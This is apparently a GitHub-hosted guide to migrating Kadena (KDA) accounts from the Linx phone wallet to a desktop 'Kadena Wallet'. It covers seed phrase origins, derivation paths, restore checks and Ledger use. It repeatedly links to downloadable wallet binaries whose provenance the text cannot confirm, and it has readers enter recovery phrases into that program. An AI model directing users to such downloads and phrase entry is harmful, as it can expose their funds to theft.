![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Moving from Linx to Kadena Wallet: Seeds and Accounts</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Linx is a phone application. Kadena Wallet is a desktop one. Moving between them is not a transfer of funds but a second program opening the same accounts, and the only thing that can go wrong in a way that matters is the derivation.

The move is worth doing if you want the balance off a device that leaves the house, or if you would rather see the whole address at full size before you approve anything. It is not worth doing if the phone is working and you have no other reason, because every migration is a chance to make a mistake with a phrase.

## You'll see this if

- You moved to Linx after Koala withdrew KDA support and now want a desktop wallet.
- A balance sits on a handset and you want it less portable.
- You use a Ledger over Bluetooth with Linx and are unsure whether a desktop can take over.
- You restored a Linx phrase elsewhere and got an empty account.

## What Linx actually holds

Linx is a mobile wallet that supports Kadena alongside another chain, and it imports accounts that originated in Koala, eckoWALLET and Chainweaver. That import support is why it became the recommendation in late 2025, and it is also why a Linx phrase may not be the phrase that originally created your accounts.

That distinction shapes the migration. If your accounts began in Koala, the phrase in Linx is a 24-word Koala phrase. If they began in eckoWALLET, it is a 12-word phrase on `m/44'/626'/0'/0/{index}`. If they began in Chainweaver, the phrase is a 12-word legacy master seed. Linx opened them; it did not necessarily generate them.

Knowing the origin tells you which derivation the desktop wallet has to support.

## Step one: inventory the accounts

Before touching a phrase, list what exists.

1. Open Linx and write down every account it shows.
2. For each account, note the address and the chain holding the balance.
3. Confirm each one in a community explorer, chain by chain.
4. Note whether any account came from an import, and from which wallet.

That last line is the one people cannot answer later. A note saying "from Koala, 2024" is worth more than an hour of guessing at derivation paths.

## Step two: restore on the desktop

1. Install Kadena Wallet from its release page for your platform.
2. Choose import rather than create.
3. Enter the words in the order the interface asks for them.
4. Derive the opening account and read the result before you fund it.
5. Compare it with the inventory from step one, character by character.
6. Set the chain the balance lives on.
7. Send a small amount to prove signing works.
8. Keep the phone install until the desktop one has been verified.

If step five matches, the migration is done. Steps six to eight are what turn a hopeful restore into a tested one.

## When the address differs

Three causes, in order of likelihood.

**The account index.** A phrase can derive many accounts. The desktop may show index zero while your funded account was index two. Step through the indices before concluding anything.

**The origin scheme.** A Koala phrase needs Koala-compatible derivation; a Chainweaver phrase needs the legacy scheme; ecko accounts use their own path. If the desktop implements a different one, the result is a valid, empty account.

**The name form.** A funded account may be a legacy name rather than a prefixed principal. Both can exist for one key, and they are separate accounts.

Address comparison settles all three, and none of them means the phrase is wrong.

## The hardware question

Linx supports a Ledger over Bluetooth, which is convenient and adds a radio link between the device and the phone. A desktop wallet connects over a cable through a browser permission instead.

If your signing currently goes through the device, the migration is about the interface, not the key: the device keeps its phrase and the desktop builds transactions for it to sign. Test with a small amount, because device connection failures look like signing failures and the cause is usually a permission or a second program holding the device.

## What does not carry over

- **Application settings.** Contacts, preferences and any in-app notes stay on the phone.
- **Bluetooth pairing.** A desktop does not use it.
- **Notification state.** Balance alerts do not follow you.

None of that affects ownership. The accounts are on-chain, and the phrase is what opens them.

## Keeping both, or removing one

Two wallets can sign for the same account when they derive the same keys. That is a legitimate arrangement and a useful fallback: the phone for convenience, the desktop for deliberate transfers.

The condition is that both were verified against the funded address. Two wallets that derive differently are not redundancy; they are one wallet and one empty interface.

Remove the phone install only after a restore has been tested and a send has completed from the desktop. Until then, the phone is your fallback, and deleting it first converts a small mismatch into a large problem.

## FAQ

**Do I have to move my funds to a new address?**
No. The words rebuild the accounts that already exist. A fresh address matters only when you think the phrase leaked.

**Will a Linx phrase work in a desktop wallet?**
It will be accepted if the word count is supported. Whether it opens your accounts depends on derivation, which is what the address comparison tests.

**Can I use the same Ledger with both?**
Yes. The device holds the key either way, and the interface changes.

**What if I no longer have the phone?**
Then the phrase is the only route, and the inventory has to come from records: exchange withdrawals, explorer history, old screenshots. Do that before importing, which turns the import into a check rather than an act of faith.

**Does moving to desktop improve security?**
It changes the exposure. A large screen verifies addresses better; a phone travels and syncs photographs by default. Neither replaces an offline copy of the phrase.

## Related reading

- Linx vs Kadena Wallet: mobile against desktop
- Migrating from Koala to Kadena Wallet after KDA removal
- eckoWALLET to Kadena Wallet: what carries over
- Backing up Kadena Wallet: a restore you have tested

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Ledger and KDA: Setup, Paths and the Ledger Live Gap](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/ledger-kda-setup-kadena-wallet.md)
- [Ledger Not Showing KDA? What Kadena Wallet Users Check First](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/ledger-not-showing-kadena-balance.md)
- [Kadena Wallet Security: A Threat Model You Can Act On](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-security-best-practices.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
